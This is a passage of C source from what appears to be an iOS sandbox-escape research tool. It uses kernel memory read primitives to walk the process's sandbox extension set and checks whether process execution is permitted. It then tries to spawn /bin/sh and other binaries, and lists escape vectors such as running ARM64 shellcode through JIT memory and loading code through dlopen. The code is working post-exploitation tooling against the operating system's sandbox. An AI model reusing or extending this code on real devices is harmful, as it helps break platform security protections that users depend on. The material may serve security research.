            // Kill the child immediately
            kill(child, SIGKILL);
            waitpid(child, NULL, 0);
        }
    }

    buf_append("\n-- v11 Analysis --\n");
    buf_append("KEY FINDINGS:\n");
    buf_append("  RWX memory: ALLOWED (v10)\n");
    buf_append("  Private frameworks: LOADED (v10)\n");
    buf_append("  System dylibs on disk: NO (shared cache only)\n");
    buf_append("VECTORS:\n");
    buf_append("  If A(JIT) works: arbitrary ARM64 shellcode exec\n");
    buf_append("  If B(SBS) works: launch apps via SpringBoard\n");
    buf_append("  If C(XPC) works: communicate with system services\n");
    buf_append("  If D(dylib) works: load custom code via dlopen\n");
    buf_append("  If E(spawn-self) works: re-exec our own binary\n");

    bc("[SWAP] v11 complete\n");
    bc_close();
    return buf_finish();
}

char *kresearch_add_exec_extension(void) {
    buf_init();
    buf_append("=== ADD PROCESS-EXEC EXTENSION (EXPERIMENTAL) ===\n\n");
    buf_append("NOTE: Sandbox extensions are class-based. Process-exec may not\n");
    buf_append("use the extension mechanism. Testing anyway...\n\n");

    // This is speculative — the sandbox may not check extensions for process-exec.
    // The filesystem escape works because file-read/write-data operations check
    // the extension set. Process operations might be profile-only.

    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    if (!kaddr_ok(self_info.extension_set)) {
        buf_append("ERROR: No extension set found\n");
        return buf_finish();
    }

    buf_append("Extension set at: 0x%llx\n", self_info.extension_set);

    // Check current sandbox state for process-exec
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    buf_append("Current process-exec status: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");

    if (exec_check == 0) {
        buf_append("Already allowed — nothing to do!\n");
        return buf_finish();
    }

    // Enumerate all extension buckets to understand the structure
    buf_append("\nCurrent extension buckets:\n");
    for (int i = 0; i < 9; i++) {
        uint64_t bucket = kread_ptr(self_info.extension_set + (i * 8));
        if (bucket && kaddr_ok(bucket)) {
            struct extension_class_node node = {0};
            kreadbuf(bucket, &node, sizeof(node));
            char name[128] = {0};
            if (kaddr_ok((uint64_t)node.class_name)) {
                kreadbuf((uint64_t)node.class_name, name, sizeof(name) - 1);
            }
            buf_append("  bucket[%d]: 0x%llx class=\"%s\" count=%llu\n",
                       i, bucket, name, (unsigned long long)node.count);

            // Walk extension list
            uint64_t ext = (uint64_t)node.ext_list_head;
            int j = 0;
            while (ext && kaddr_ok(ext) && j < 5) {
                struct extension e = {0};
                kreadbuf(ext, &e, sizeof(e));
                char path[128] = {0};
                if (kaddr_ok((uint64_t)e.data_ptr)) {
                    kreadbuf((uint64_t)e.data_ptr, path, sizeof(path) - 1);
                }
                buf_append("    ext: path=\"%s\" pathlen=%llu sc=%d\n",
                           path, (unsigned long long)e.path_len, e.file.storage_class);
                ext = (uint64_t)e.next;
                j++;
            }
        }
    }

    buf_append("\nTo add a process-exec extension, we would need to create a new\n");
    buf_append("extension_class_node for 'com.apple.sandbox.executable' and link it\n");
    buf_append("into the extension set. However, this requires allocating kernel memory\n");
    buf_append("for the new structures, which is complex with only kwrite.\n");
    buf_append("\nRecommendation: Try sandbox profile swap first (kresearch swap_profile).\n");

    return buf_finish();
}

char *kresearch_test_spawn(void) {
    buf_init();
    buf_append("=== POSIX_SPAWN TEST ===\n\n");

    // Check sandbox state
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    int fork_check = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
    buf_append("sandbox process-exec /bin/sh: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");
    buf_append("sandbox process-fork: %s\n",
               fork_check == 0 ? "ALLOWED" : "BLOCKED");

    // Check our credentials
    buf_append("getuid()=%d geteuid()=%d\n", getuid(), geteuid());

    // Try posix_spawn with different binaries
    const char *binaries[] = {"/bin/sh", "/bin/echo", "/usr/bin/id", NULL};
    for (int i = 0; binaries[i]; i++) {
        buf_append("\nTrying posix_spawn(%s):\n", binaries[i]);

        pid_t child = 0;
        char *argv[] = {(char *)binaries[i], NULL};
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            char *sh_argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
            argv[0] = sh_argv[0];
            // Can't reassign fixed array, do it inline
        }
        char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};

        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);

        char *spawn_argv[4];
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            spawn_argv[0] = "/bin/sh";
            spawn_argv[1] = "-c";
            spawn_argv[2] = "echo spawn_ok";
            spawn_argv[3] = NULL;
        } else {
            spawn_argv[0] = (char *)binaries[i];
            spawn_argv[1] = NULL;
        }

        int ret = posix_spawn(&child, binaries[i], NULL, &attr, spawn_argv, envp);
        posix_spawnattr_destroy(&attr);

        if (ret == 0) {
            buf_append("  SUCCESS! PID=%d\n", child);
            int status = 0;
            waitpid(child, &status, 0);
            int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
            buf_append("  Exit code: %d\n", exit_code);
        } else {
            buf_append("  FAILED: %d (%s)\n", ret, strerror(ret));
            // Decode specific errno
            switch (ret) {
                case EPERM:
                    buf_append("  → EPERM: Operation not permitted (credential/sandbox issue)\n");
                    break;
                case ENOENT:
                    buf_append("  → ENOENT: Binary not found at path\n");
                    break;
                case EACCES:
                    buf_append("  → EACCES: Permission denied (filesystem access)\n");
                    break;
                case ENOEXEC:
                    buf_append("  → ENOEXEC: Not executable (code signing?)\n");
                    break;
                default:
                    break;
            }
        }
    }

    return buf_finish();
}
